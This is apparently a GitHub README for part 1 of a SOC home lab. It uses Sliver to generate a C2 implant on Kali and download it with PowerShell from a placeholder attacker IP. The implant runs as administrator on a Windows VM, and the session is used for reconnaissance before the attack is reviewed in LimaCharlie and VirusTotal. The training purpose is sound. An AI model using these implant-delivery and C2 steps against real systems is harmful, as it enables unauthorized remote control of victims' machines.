# SOC-Lab
This is a SOC focused home lab that will use a variety of tools including Sliver to simulate an attack on a vulnerable machine. During this lab the vulberable machine is the Windows VM, attacking machine will be a Kali Linux, and the monitoring tool will be LimaWire. 

# As a disclaimer, the original idea for this lab comes from Eric Capuano. Setting up the lab environment has been purposefully left out and I highly suggest anyone interested in replicating this lab visit his Substack page(linked below)!

[Eric's Substack](https://blog.ecapuano.com/p/so-you-want-to-be-a-soc-analyst-intro)

# SOC-Lab

## Objective

The SOC Lab is designed to showcase my skills in a simulated real world environment with an attacker(Linux) and Defender(Windows). The SOC home lab is designed to simulate real-world cybersecurity environments, allowing me to practice identifying, investigating, and mitigating cyber threats in a controlled setting. Its primary objective is to provide hands-on experience with security tools, techniques, and processes, helping me to develop practical skills in network monitoring, threat detection, and response strategies. Additionally, it aims to foster a deeper understanding of the cybersecurity landscape, including the tactics, techniques, and procedures (TTPs) used by attackers. By recreating the challenges faced by professional SOCs, this home lab serves as a valuable educational platform for an aspiring cybersecurity professional, such as myself, enhancing my readiness for careers in the rapidly evolving field of information security.
### Skills Learned

- Learning to identify and analyze potential security threats in network traffic and logs, using tools like SIEM (Security Information and Event Management) systems.
- Developing the skills necessary to effectively respond to and manage security incidents, including containment strategies, eradication of threats, and recovery processes.
- Gaining experience in monitoring network traffic for suspicious activity and conducting forensic analysis to understand the nature and impact of security breaches.
- Learning about the development and implementation of security policies and best practices to protect organizational assets and data.
- Acquiring the ability to use threat intelligence feeds and sources to anticipate and defend against potential cyber attacks, understanding the tactics, techniques, and procedures used by cybercriminals

### Tools Used


- VMWare to host the Virtual Environments. 
- LimaCharlie for network monitoring and management. 
- Linux VM to serve as attacking machine.
- Windows VM to serve as Victim machine.
- Sliver, an open source red team tool, used to launch payloads and maintainn persistence on victims machine.

  ### Steps: Part 1

  1. Drop into a root shell and change directory to our Sliver install
       - sudo su
       - cd /opt/sliver
  2. Launch sliver server
       - sliver-server

    ![4 Sliver](https://github.com/Lantern76/SOC-Lab/assets/119342094/6a6d3fb1-6f62-448a-97e2-3638c10332a8)

  3. Generate our first C2 session payload (within the Sliver shell) using the attacking machines IP address.
       - generate --http  --save /opt/sliver

![2 generate payload](https://github.com/Lantern76/SOC-Lab/assets/119342094/e864ec91-db64-4aa6-a74f-c910cf9d44e1)

  4. Confirm the new implant configuration
       - implants

  ![3](https://github.com/Lantern76/SOC-Lab/assets/119342094/b7064aaf-9dca-4a98-be00-011422b3f89e)

  5. Now we have a C2 payload we can drop onto our Windows VM. We’ll do that next. Go ahead and exit Sliver for now
       - exit
  6. To easily download the C2 payload from the Linux VM to the Windows VM, let’s use a little python trick that spins up a temporary web server
       - cd /opt/sliver
       - python3 -m http.server 80
  7. Switch to the Windows VM and launch an Administrative PowerShell console
  8. Now I run the following command to download my C2 payload from the Linux VM to the Windows VM, using my own Linux VM IP and the name of the payload I generated in Sliver, RAPID_PLENTY.exe, a few steps prior
       - IWR -Uri http://[Linux_VM_IP]/REGULAR_PLENTY.exe -Outfile C:\Users\User\Downloads\REGULAR_PLENTY.exe
  9. Now that the payload is on the Windows VM, we must switch back to the Linux VM SSH session and enable the Sliver HTTP server to catch the callback
       - First I need to terminate the python web server by pressing Ctrl + c
       - Next is to relaunch Sliver
           - sliver-server
        - Begin the Sliver HTTP listener
            -http
  10. Return to the Windows VM and launch a powershell session as an administrator. Afterwords launch the payload
        - C:\Users\User\Downloads\RAPID_PLENTY.exe
  11. Within a few moments, you should see my session check in on the Sliver server

  ![6 sliver sessions](https://github.com/Lantern76/SOC-Lab/assets/119342094/4383b004-3e19-43af-93b2-1d01dce94c0b)

  12. I then need to verify my session in Sliver, taking note of the Session ID
        - sessions

  ![5 sliver server](https://github.com/Lantern76/SOC-Lab/assets/119342094/0ae65380-7053-44f1-b4d8-c4bf2a50fd3a)

  13. To interact with my new C2 session, I type the following command into the Sliver shell, swapping [session_id] with one shown in image

  ![7 sliver sessions](https://github.com/Lantern76/SOC-Lab/assets/119342094/b0ef3872-d516-4add-833b-2be37bf1f975)

  14. I am now interacting directly with the C2 session on my Windows VM. Let’s run a few basic commands to get our bearing on the victim host
        - Get basic info about the session
            - info
        - Find out what user my implant is running as, and learn it’s privileges
            - whoami
            - getprivs
        - As a side note, since the implant was run with admin rights, you’ll notice we have a few privileges that make further attack activity much easier, such as “SeDebugPrivilege” 

![1](https://github.com/Lantern76/SOC-Lab/assets/119342094/8024c4fd-f411-4b01-9c68-112830e5e7d9)

  15. Identify our implant’s working directory
        - netstat
  16. Identify the running processes on the remote system
        - ps -T
        - Fun tip, Sliver will higlight its own processin green and any defensive tools in red
  17. Let’s hop into the LimaCharlie web UI and check out some basic features
        - Click “Sensors” on left menu
        - Click your active Windows sensor

![8 LimaCharlie sesnsors](https://github.com/Lantern76/SOC-Lab/assets/119342094/8b526208-145a-4e70-9ee4-05f4a84f73c7)

  18. On the new left-side menu for this sensor, click “Processes”

![9 LimaCharlie Processes](https://github.com/Lantern76/SOC-Lab/assets/119342094/15ca7ee1-39c1-42b1-94a3-ec9ef085f81c)

  19. Now I need to click the “Network” tab on the left-side menu

![10 LimaCharlie Network](https://github.com/Lantern76/SOC-Lab/assets/119342094/258c12f9-b985-4406-a626-acdc2799e72c)

  20. Next I click on the “File System” tab on the left-side menu

![11 LimaCharlie file system](https://github.com/Lantern76/SOC-Lab/assets/119342094/4c04d6ad-1664-4c01-b43e-bdaff3fbcad1)

  21. Finally, I inspect the hash of the suspicious executable by scanning it with VirusTotal

![12 Virus total ](https://github.com/Lantern76/SOC-Lab/assets/119342094/afe0a49c-c917-4039-ad15-ecf695603985)


### That conclodes part 1 of the home SOC lab. Part 2 will be uploaded soon and will countinue below :) 


































  
   
